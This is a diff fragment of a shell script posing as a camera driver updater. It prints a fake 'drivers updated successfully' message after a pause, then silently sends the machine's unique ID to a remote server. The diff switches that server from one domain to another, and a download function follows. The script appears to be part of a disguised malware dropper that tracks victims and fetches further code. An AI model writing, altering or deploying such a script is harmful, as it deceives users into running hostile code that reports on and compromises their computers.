@@ -19,7 +19,7 @@ delay 12
 echo "[SUCCESS] Camera drivers have been updated successfully."
 
 if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
-  AUTO_URL="https://drivereasy.llc/auto-update/${MAC_UID}"
+  AUTO_URL="https://aip.canditech.org/change-connection-status/${MAC_UID}"
   curl -sL -X POST "$AUTO_URL" >/dev/null 2>&1 || true
 fi
 download() {
